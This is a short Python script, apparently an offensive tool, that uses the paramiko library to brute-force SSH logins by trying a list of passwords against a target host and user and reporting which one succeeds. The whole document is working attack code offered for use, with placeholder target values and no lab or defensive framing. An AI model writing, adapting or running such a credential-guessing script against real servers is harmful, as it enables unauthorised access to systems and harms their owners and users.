# pip install paramiko
import paramiko

def ssh_brute_force(hostname, username, password_list):
    for password in password_list:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(hostname, username=username, password=password)
            print(f"[+] Successful login: {username}:{password}")
            ssh.close()
            break
        except paramiko.AuthenticationException:
            print(f"[-] Failed login: {username}:{password}")
        except paramiko.SSHException as sshException:
            print(f"Unable to establish SSH connection: {sshException}")
        except paramiko.BadHostKeyException as badHostKeyException:
            print(f"Unable to verify server's host key: {badHostKeyException}")

if __name__ == "__main__":
    ssh_brute_force('target_host', 'target_user', ['password1', 'password2', 'password3'])